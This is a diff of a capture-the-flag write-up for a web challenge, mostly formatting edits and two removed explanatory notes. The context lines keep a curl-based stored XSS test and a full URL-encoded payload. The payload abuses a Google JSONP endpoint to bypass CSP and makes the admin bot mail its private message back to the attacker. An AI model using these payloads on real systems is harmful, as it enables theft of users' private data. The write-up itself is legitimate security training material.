@@ -75,6 +75,7 @@ Two options came to mind:
 
 1. Read admin's messages directly — nope, blocked cold by a `recipient_id` check 😤
 2. Trick admin's own browser into reading it for me, and mailing the answer back — this is the way (hello, XSS)
+
 ## 2. Discovering the bugs
 
 ### Bug #1 — A Copy-Paste Gone Wrong ➜ Stored XSS
@@ -160,7 +161,7 @@ frame-ancestors 'none'
 ## 3. time to get my hand dirty
 
 ### overview of the web app
-- this is how the web app looks like after i registered a user and login.
+this is how the web app looks like after i registered a user and login.
 ![](/assets/img/images/massagold-2.webp)
 ### Step 1 — First, Just Break the HTML
 Before doing anything fancy, I wanted to confirm the HTML break-out actually works, so I sent this to myself:
@@ -171,7 +172,7 @@ curl -X POST http://TARGET:PORT/messages \
   --data-urlencode 'to_username=YOUR_USER' \
   --data-urlencode 'content=</pre></div></section></main><h1>INJECTED</h1>'
 ```
-- received a message from myself:
+received a message from myself:
 ![](/assets/img/images/massagold-3.webp)
 Opened the message and yep, there it was:
 
@@ -190,7 +191,7 @@ The `</pre>` closes the pre tag, `</div></section></main>` peels back the wrappi
 **TRICK**: if use burp suite, make sure proper URL encoded by pressing CTRL+U for the content payload:
 ![](/assets/img/images/massagold-5.webp)
 ![](/assets/img/images/massagold-6.webp)
-Above is after i tested injecting a JSONP script.
+Above is after i injected a JSONP script.
 
 ### Step 2 — Testing the Google JSONP Trick
 we can debug the script by sending a seal message to ourselves.
@@ -340,15 +341,11 @@ fetch%28%27%2Fmessages%2F1%27%29.then%28function%28r%29%7Breturn%20r.text%28%29%
 </pre></div></section></main><script src="https://www.googleapis.com/customsearch/v1?callback=fetch%28%27%2Fmessages%2F1%27%29.then%28function%28r%29%7Breturn%20r.text%28%29%7D%29.then%28function%28t%29%7Bfetch%28%27%2Fmessages%27%2C%7Bmethod%3A%27POST%27%2Cbody%3Anew%20URLSearchParams%28%7Bto_username%3A%27YOUR_USER%27%2Ccontent%3At%7D%29%7D%29%7D%29&key=x&cx=x&q=x"></script>
 ```
 
-> **Why regex fails through Google JSONP:** Google's callback validation rejects special characters (`'`, `()`, `{}`, `\`, `/`) but still reflects the callback in the response. However, it escapes backslashes — so `/HTB\{[^}]+\}/` becomes `/HTB\\{[^}]+\\}/` in the response, which is a different regex that doesn't match. Sending the full page text avoids this entirely.
-
-> **Burp/curl encoding pitfall:** The `&key=x&cx=x&q=x` inside the Google URL must NOT be interpreted as separate POST parameters. In curl, use `--data-urlencode` for the `content` field. In Burp, URL-encode the `&` characters inside the content value as `%26`, or right-click the content value → "URL-encode key characters".
-
-- After send, we will be receiving the message from admin bot:
+After send, we will be receiving the message from admin bot:
 ![](/assets/img/images/massagold-10.webp)
 Open it, you will feel like it is a nested sealed scrolls.
 ![](/assets/img/images/massagold-11.webp)
-- Get the flag by CTRL+U and scroll down.
+Get the flag by CTRL+U and scroll down.
 ![](/assets/img/images/massagold-12.webp)
 
 ## 5. I also build a one shot script.
